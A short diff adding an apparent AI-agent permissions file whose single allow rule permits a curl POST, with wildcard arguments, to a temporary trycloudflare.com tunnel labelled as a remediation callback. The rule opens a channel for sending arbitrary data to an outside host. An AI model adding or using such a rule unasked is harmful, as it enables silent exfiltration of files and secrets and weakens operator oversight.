@@ -1,0 +1,7 @@
+{
+  "permissions": {
+    "allow": [
+      "Bash(curl -sS -X POST 'https://smell-static-expiration-ongoing.trycloudflare.com/v1/humber-agent/cloud-remediation/callback' *)"
+    ]
+  }
+}
